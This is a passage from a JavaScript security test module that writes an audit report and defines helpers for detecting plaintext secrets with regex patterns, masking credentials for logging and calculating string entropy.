  const reportPath = path.join(testSuite.TEST_CONFIG.tempDir, 'security-audit-report.json');
  fs.writeFileSync(reportPath, JSON.stringify(securityReport, null, 2));

  logger.debug(`Security audit report written to: ${reportPath}`);

  logger.debug('Security audit and compliance completed successfully');
}

/**
 * Detect secrets in file
 */
function detectSecretsInFile(filePath) {
  if (!fs.existsSync(filePath)) return [];

  const content = fs.readFileSync(filePath, 'utf8');
  return detectSecretsInContent(content);
}

/**
 * Detect secrets in content
 */
function detectSecretsInContent(content) {
  const secretPatterns = [
    { type: 'AWS Access Key', pattern: /AKIA[0-9A-Z]{16}/g },
    { type: 'AWS Secret Key', pattern: /[A-Za-z0-9+/]{40}/g },
    { type: 'Private Key', pattern: /-----BEGIN[A-Z ]+PRIVATE KEY-----/g },
    { type: 'API Token', pattern: /[a-zA-Z0-9_-]{32,}/g },
    { type: 'Password', pattern: /password\s*[=:]\s*[^#\n\r]+/gi },
    { type: 'Secret', pattern: /secret\s*[=:]\s*[^#\n\r]+/gi },
    { type: 'Token', pattern: /token\s*[=:]\s*[^#\n\r]+/gi }
  ];

  const detected = [];

  for (const { type, pattern } of secretPatterns) {
    const matches = content.match(pattern);
    if (matches) {
      detected.push(...matches.map(match => ({ type, value: match })));
    }
  }

  return detected;
}

/**
 * Mask credential for logging
 */
function maskCredential(credential) {
  if (!credential || credential.length < 8) return '***';

  const visibleLength = Math.min(4, credential.length * 0.25);
  const visible = credential.substring(0, visibleLength);
  const masked = '*'.repeat(credential.length - visibleLength);

  return visible + masked;
}

/**
 * Process credential safely (simulation)
 */
function processCredentialSafely(credential) {
  // Simulate secure processing
  const hash = crypto.createHash('sha256').update(credential).digest('hex');
  return `processed_${hash.substring(0, 8)}`;
}

/**
 * Calculate entropy of a string
 */
function calculateEntropy(str) {
  const freq = {};
  for (const char of str) {
    freq[char] = (freq[char] || 0) + 1;
  }

  let entropy = 0;
  const len = str.length;

  for (const count of Object.values(freq)) {
    const p = count / len;
    entropy -= p * Math.log2(p);
  }

  return entropy;
}

module.exports = {
  runTests,
  testPlaintextSecretDetection,
  testFilePermissionValidation,
  testCredentialProtectionMeasures,
  testEncryptionVerification,
  testSecurityConfigurationValidation,
  testAttackSurfaceAnalysis,
  testInputValidationSanitization,
  testSecureCommunicationValidation,
  testSecurityAuditCompliance,
  detectSecretsInFile,
  detectSecretsInContent,
  maskCredential,
  calculateEntropy,
};